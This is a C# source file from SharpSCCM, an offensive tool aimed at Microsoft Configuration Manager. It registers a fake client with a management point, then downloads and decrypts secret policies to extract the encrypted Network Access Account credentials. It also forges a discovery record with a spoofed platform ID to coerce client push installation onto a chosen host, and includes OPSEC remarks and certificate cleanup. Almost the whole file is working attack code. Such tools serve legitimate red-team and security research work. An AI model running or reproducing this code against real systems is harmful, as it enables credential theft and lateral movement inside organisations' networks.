using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace SharpSCCM
{
    static class MgmtPointMessaging
    {
        static MessageCertificateX509 CreateCertificate()
        {
            // Generate certificate for signing and encrypting messages
            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
            return certificate;
        }

        public static MessageCertificateX509Volatile CreateUserCertificate(string subjectName = null, bool store = false)
        {
            // Generate certificate for signing and encrypting messages
            RSA rsaKey = RSA.Create(2048);
            if (string.IsNullOrEmpty(subjectName))
            {
               subjectName = "ConfigMgr Client Messaging";
            }
            CertificateRequest certRequest = new CertificateRequest($"CN={subjectName}", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
            // Any extended key usage
            certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
            X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            certificate2.FriendlyName = $"{subjectName}";
            X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
            Console.WriteLine($"[+] Created \"{subjectName}\" in memory for device registration and signing/encrypting subsequent messages");
            if (store)
            {
                var x509Store = new X509Store("My", StoreLocation.CurrentUser);
                x509Store.Open(OpenFlags.MaxAllowed);
                x509Store.Add(exportedCert);
                Console.WriteLine($"[+] Wrote \"{subjectName}\" certificate to {x509Store.Name} store for {x509Store.Location}");
            }
            MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
            return certificate;
        }

        public static void DeleteUserCertificate(MessageCertificateX509 certificate)
        {
            var x509Store = new X509Store("My", StoreLocation.CurrentUser);
            x509Store.Open(OpenFlags.MaxAllowed);
            x509Store.Remove(certificate.X509Certificate);
            Console.WriteLine($"[+] Deleted \"{certificate.X509Certificate.SubjectName}\" certificate from {x509Store.Name} store for {x509Store.Location}");
        }
        
        public static MessageCertificateX509 GetEncryptionCertificate()
        {
            // Get encryption certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
            return certificate;
        }

        public static async void GetNetworkAccessAccounts(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null)
        {
            // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
            // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
            // OPSEC warning: I'm not sure why, but this method does not work without temporarily storing the certificate on disk
            MessageCertificateX509 certificate = CreateUserCertificate(null, true);
            SmsClientId clientId = RegisterClient(certificate, null, managementPoint, siteCode, "Windows", username, password);

            // Send request for policy assignments to obtain policy locations
            ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, certificate, managementPoint, siteCode);

            // Get secret policies
            string output = null;
            foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
            {
                if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
                {
                    Console.WriteLine("[+] Found policy containing secrets:");
                    Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
                    Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
                    Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");

                    // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                    string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), certificate);
                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                    Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");



                    // Parse response ASN1 and decrypt contents
                    ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
                    EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
                    pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
                    RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
                    pkcs7EnvelopedCms.Decrypt(encryptedKey);
                    Console.WriteLine($"[+] Successfully decoded and decrypted secret policy {policyAssignment.Policy.Id}");
                    // Delete the certificate from the current user store
                    DeleteUserCertificate(certificate);
                    string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
                    output += decryptedPolicyBody;
                    
                    if (decryptedPolicyBody.Contains("NetworkAccess"))
                    {
                        XmlDocument policyXmlDoc = new XmlDocument();
                        policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
                        string encryptedUsername = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.InnerText;
                        string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
                        Console.WriteLine($"[+] Encrypted NAA username: {encryptedUsername}");
                        Console.WriteLine($"[+] Encrypted NAA password: {encryptedPassword}");
                    }

                    /*
                    // Code borrowed from SetCustomHeader method, exception on Decrypt method
                    ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
                    Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
                    string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
                    senderProperty["ClientToken"] = clientTokenHeader;
                    senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                    policyDownloadRequest.DownloadSecrets = true;
                    ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
                    */
                }
            }
            if (!string.IsNullOrEmpty(outputPath))
            {
                File.WriteAllText(outputPath, output);
                Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
            }
        }

        public static MessageCertificateX509 GetSigningCertificate()
        {
            // Get signing certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
            return certificate;
        }

        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string username = null, string password = null)
        {
            HttpSender sender = new HttpSender();
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
            // Add the certificate that will be tied to the new client ID for message signing and encryption
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);

            // Discover local properties for client registration request
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();

            // Modify properties
            Console.WriteLine("[+] Modifying client registration request properties:");
            registrationRequest.AgentIdentity = "CCMSetup.exe";
            if (!string.IsNullOrEmpty(target))
            {
                registrationRequest.ClientFqdn = target;
                registrationRequest.NetBiosName = target;
            }
            Console.WriteLine($"      FQDN: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"      NetBIOS name: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            if (authenticationType == "Windows")
            {
                registrationRequest.Settings.Security.AuthenticationType = AuthenticationType.WindowsAuth;
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    Console.WriteLine($"      Authenticating as: {username}");
                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(username, password);
                }
            }
            Console.WriteLine($"      Site code: {registrationRequest.SiteCode}");

            // Serialize message XML and display to user
            registrationRequest.SerializeMessageBody();
            //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");

            // Register client and wait for a confirmation with the SMSID
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
            Console.WriteLine($"[+] Received unique GUID for new device: {clientId}");
            return clientId;
        }

        public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();

            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);

            // Discover local properties for DDR inventory report
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            ddrMessage.Discover(); // This is required to generate the inventory report XML

            // Modify properties
            Console.WriteLine("[+] Modifying DDR and inventory report properties");
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
            // Set target to local machine if not provided in command line option
            if (string.IsNullOrEmpty(target))
            {
                target = originalSourceHost;
            }
            ddrMessage.Settings.SourceHost = target;
            ddrMessage.NetBiosName = target;
            ddrMessage.SiteCode = siteCode;
            // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
            ddrMessage.SerializeMessageBody(); 

            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;

            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);

            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            XmlDocument inventoryXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
            // Replace original FQDN with supplied one
            XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
            fqdnNode.InnerText = target;
            XmlNode modifiedXml = inventoryXmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Replace original NetBIOS name with supplied name
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);

            // Display XML to user
            //Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
            //Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");

            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
            ddrMessage.SendMessage(sender);
            Console.WriteLine("[+] Done!");
        }

        public static ConfigMgrPolicyAssignmentReply SendPolicyAssignmentRequest(SmsClientId clientId, MessageCertificateX509 certificate, string managementPoint, string siteCode)
        {
            HttpSender sender = new HttpSender();
            ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
            // Sign message with the certificate associated with the SmsId
            assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            assignmentRequest.SmsId = clientId;
            assignmentRequest.Settings.HostName = managementPoint;
            assignmentRequest.SiteCode = siteCode;
            Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
            ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
            Console.WriteLine($"[+] Found {assignmentReply.ReplyAssignments.PolicyAssignments.Count} policy assignments");
            return assignmentReply;
        }

        public static HttpResponseMessage SendPolicyDownloadRequest(string url, string clientId = null, MessageCertificateX509 certificate = null)
        {
            HttpClientHandler httpClientHandler = new HttpClientHandler() { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate };
            HttpClient httpClient = new HttpClient(httpClientHandler);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            // Add authentication headers required to download policies flagged "Secret"
            if (!string.IsNullOrEmpty(clientId) && (certificate != null))
            {
                string currentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
                string clientTokenHeader = $"{clientId};{currentTimeAsIso};2";
                httpClient.DefaultRequestHeaders.Add("ClientToken", clientTokenHeader);
                byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(clientTokenHeader + "\0");
                string clientTokenSignatureHeader = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                Console.WriteLine("[+] Adding authentication headers to download request:\n" +
                                  $"      ClientToken: {clientTokenHeader}\n" +
                                  $"      ClientTokenSignature: {clientTokenSignatureHeader}"
                                  );
                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", clientTokenSignatureHeader);
            }
            var response = httpClient.SendAsync(request).Result;
            return response;
        }
    }
}